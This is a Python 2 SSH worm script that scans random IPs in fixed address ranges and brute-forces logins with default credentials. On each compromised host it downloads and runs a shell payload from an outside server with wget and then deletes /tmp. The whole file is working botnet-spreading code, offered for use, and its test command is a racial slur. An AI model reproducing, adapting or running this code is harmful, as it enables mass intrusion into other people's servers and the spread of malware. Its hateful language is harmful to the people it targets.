#!/usr/bin/python
# For the kids who still scan SSH

# SSH Scanner By LiGhT


import threading, sys, time, random, socket, re, os, paramiko

if len(sys.argv) < 4:
	print "SSH Scanner\n    By: LiGhT"
	print "Usage: python "+sys.argv[0]+" <threads(1-100+)> <ips(1-1000+)> <pass list(1,2,3)>"
	print "Example: python "+sys.argv[0]+" 100 1000 1"
	sys.exit()

if sys.argv[3] == "1":
	ssh_passwords = ["admin:1234"] #fastest infection rate, lowest results
elif sys.argv[3] == "2":
	ssh_passwords = ["admin:1234", "root:1234"] #decent speed, more results
elif sys.argv[3] == "3":
	ssh_passwords = ["admin:1234", "root:1234", "root:root", "root:admin", "admin:admin"] #slow af but hella results

sh_file = "http://103.194.169.245/bins.sh" # SH File
threads = int(sys.argv[1])
ipz = int(sys.argv[2])
paramiko.util.log_to_file("/dev/null") #quiets paramiko output
Sranges = ["49.150","91.98","5.78","122.3","122.52","122.54","119.93","124.105"]

def worker():
	try:
		print "\033[36mStarting SSH Thread\033[37m"
		while True:
			try:
				ipzh0 = ipz + 1
				br = random.choice(Sranges)
				for x in xrange(ipzh0):
					try:
						ip = ''+br+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						ss = sssh(ip)
						ss.start()
						time.sleep(0.009)
					except:
						pass
				time.sleep(1)
			except:
				print "\033[31mERROR\033[37m"
				pass
	except:
		pass


class sssh(threading.Thread): #BBB
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		x = 1
		while x != 0:
			try:
				username='root'
				password="0"
				port = 22
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in ssh_passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo nigger")
				output = stdout.read()
				if "nigger" in output:
					badserver=False	
				if badserver == False:
					print "\033[36m[SSH] Command Sent %s!\033[37m"%(self.ip)
					ssh.exec_command("cd /tmp; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*")
					time.sleep(10)
					ssh.close()
					x = 0
				if badserver == True:
					ssh.close()
			except:
				pass
			x = 0

for g in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
		time.sleep(0.002)
	except:
		pass